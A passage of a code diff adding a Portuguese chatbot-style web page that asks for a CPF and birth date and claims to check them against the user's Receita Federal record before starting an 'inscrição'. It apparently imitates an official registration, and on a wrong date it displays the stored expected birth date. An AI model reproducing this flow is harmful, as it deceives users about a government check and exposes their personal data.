+                                                    <button class="retry-btn" id="retry-cpf">Tentar novamente</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    `;
+                                    
+                                    container.appendChild(errorMsg);
+                                    scrollArea.scrollTop = scrollArea.scrollHeight;
+                                    
+                                    // Botão para tentar novamente
+                                    document.getElementById('retry-cpf').addEventListener('click', function() {
+                                        // Remover a mensagem de erro
+                                        errorMsg.remove();
+                                        
+                                        // Tentar novamente
+                                        cpfStep();
+                                    });
+                                }
+                            });
+                        }
+                    }, "500");
+                }
+                cpfStep();
+            }
+
+            function next_step() {
+                setTimeout(() => {
+                    var novaMsg = document.createElement('div');
+                    novaMsg.className = 'msg-bot slide-in';
+                    novaMsg.innerHTML = `
+                <div class="msg-bot">
+                        <div class="body-msg">
+                            <div size="70" class="avatar-msg avatar-felicidade"><div></div></div>
+                            <div direction="left" tabindex="0" class="text-msg">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                </svg>
+                                <div>
+                                    <p>Qual sua data de nascimento?</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+            `;
+
+                    container.appendChild(novaMsg);
+                    scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                    $('.css-15nda4v').attr('type', 'tel').attr('name', 'nascimento').attr('readonly', false).mask('00/00/0000').focus();
+                    $('.css-10nvitp button').attr('disabled', false).removeClass('jss7').attr('id', 'send-nasc');
+                    $('.css-1qh4aj3').addClass('css-1c97vgy');
+
+                    let input = document.querySelector('.css-15nda4v');
+                    input.onfocus = function () {
+                        this.closest('.css-1qh4aj3').classList.add('css-1c97vgy');
+                    };
+                    input.onblur = function () {
+                        this.closest('.css-1qh4aj3').classList.remove('css-1c97vgy');
+                    };
+                    input.onkeydown = function (event) {
+                        if (event.key === 'Enter') {
+                            event.preventDefault();
+                            document.querySelector('#send-nasc')?.click();
+                        }
+                    };
+
+                    document.querySelector('.css-15nda4v').addEventListener('blur', function () {
+                        this.closest('.css-1qh4aj3').classList.remove('css-1c97vgy');
+                    });
+
+                    document.querySelector('.css-15nda4v').addEventListener('keydown', function (event) {
+                        if (event.key === 'Enter') {
+                            event.preventDefault();
+                            document.querySelector('#send-nasc')?.click();
+                        }
+                    });
+
+                    document.querySelector('#send-nasc').onclick = function (event) {
+                        var data = $('.css-15nda4v').val();
+
+                        $('.css-15nda4v').removeAttr('type').removeAttr('name').attr('readonly', true).unmask().val('').blur();
+                        $('.css-10nvitp button').attr('disabled', false).addClass('jss7').removeAttr('id');
+
+                        var msgUsuario = document.createElement('div');
+                        msgUsuario.className = 'msg-user slide-in-right';
+                        msgUsuario.innerHTML = `
+                <div direction="right" tabindex="0" class="body-msg">
+                        <span>
+                        <p>${data}</p>
+                        </span>
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                        </svg>
+                    </div>
+                `;
+
+                        container.appendChild(msgUsuario);
+                        scrollArea.scrollTop = scrollArea.scrollHeight;
+                        
+                        // Validar formato da data
+                        if (!validarData(data)) {
+                            debugLog(`Data inválida: ${data}`);
+                            
+                            var errorMsg = document.createElement('div');
+                            errorMsg.className = 'msg-bot slide-in';
+                            errorMsg.innerHTML = `
+                            <div class="msg-bot">
+                                <div class="body-msg">
+                                    <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                    <div direction="left" tabindex="0" class="text-msg">
+                                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                        </svg>
+                                        <div>
+                                            <p>A data informada é diferente de seu cadastro na receita federal, tente novamente!</p>
+                                           
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            `;
+                            
+                            container.appendChild(errorMsg);
+                            scrollArea.scrollTop = scrollArea.scrollHeight;
+                            
+                            // Voltar para a etapa de data
+                            setTimeout(() => {
+                                next_step();
+                            }, 1000);
+                            
+                            return;
+                        }
+
+                        try {
+                            const cpfDataString = localStorage.getItem('cpfData');
+                            const cpfData = JSON.parse(cpfDataString);
+                            debugLog(`Dados do CPF armazenados: ${JSON.stringify(cpfData)}`);
+                            debugLog(`Data informada: ${data}, Data esperada: ${cpfData.nascimento}`);
+                            
+                            if (data === cpfData.nascimento) {
+                                // Data correta
+                                setTimeout(() => {
+                                    var novaMsg = document.createElement('div');
+                                    novaMsg.className = 'msg-bot slide-in';
+                                    novaMsg.innerHTML = `
+                                <div class="msg-bot">
+                                    <div class="body-msg">
+                                        <div size="70" class="avatar-msg avatar-felicidade"><div></div></div>
+                                        <div direction="left" tabindex="0" class="text-msg">
+                                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                            </svg>
+                                            <div>
+                                                <p>Ok. Tudo pronto para começarmos sua inscrição?</p>
+                                                <button type="button" id="start" class="btn-iniciar-inscricao">Iniciar a inscrição</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                `;
+
+                                    container.appendChild(novaMsg);
+                                    scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                                    $('#start').click(function () {
+                                        window.location.href = "inicio.html";
+                                    });
+                                }, "500");
+                            } else {
+                                // Data incorreta
+                                setTimeout(() => {
+                                    var novaMsg = document.createElement('div');
+                                    novaMsg.className = 'msg-bot slide-in';
+                                    novaMsg.innerHTML = `
+                                <div class="msg-bot">
+                                        <div class="body-msg">
+                                            <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                            <div direction="left" tabindex="0" class="text-msg">
+                                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                                </svg>
+                                                <div>
+                                                    <p>A data informada é diferente de seu cadastro na receita federal, tente novamente!</p>
+                                                    <p>Data esperada: ${cpfData.nascimento}</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                `;
+
+                                    container.appendChild(novaMsg);
+                                    scrollArea.scrollTop = scrollArea.scrollHeight;
+                                    
+                                    setTimeout(() => {
+                                        next_step();
+                                    }, "500");
+                                }, "500");
+                            }
+                        } catch (error) {
+                            // Erro ao processar a data
+                            debugLog(`Erro ao processar data: ${error.message}`);
+                            setTimeout(() => {
+                                var novaMsg = document.createElement('div');
+                                novaMsg.className = 'msg-bot slide-in';
+                                novaMsg.innerHTML = `
+                            <div class="msg-bot">
+                                    <div class="body-msg">
+                                        <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                        <div direction="left" tabindex="0" class="text-msg">
+                                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                            </svg>
+                                            <div>
+                                                <p>Ocorreu um erro ao verificar sua data de nascimento. Tente novamente.</p>
+                                                <div class="error-details">
+                                                    Erro: ${error ? error.message : 'Erro desconhecido'}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
+
+                                container.appendChild(novaMsg);
+                                scrollArea.scrollTop = scrollArea.scrollHeight;
+                                
+                                setTimeout(() => {
+                                    next_step();
+                                }, "500");
+                            }, "500");
+                        }
+                    }
+                }, "500");
+            }
+        });
+    </script>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/jquery.mask.min.js"></script>
+    <script src="js/functions.js"></script>
+
+
+
+</body></html>
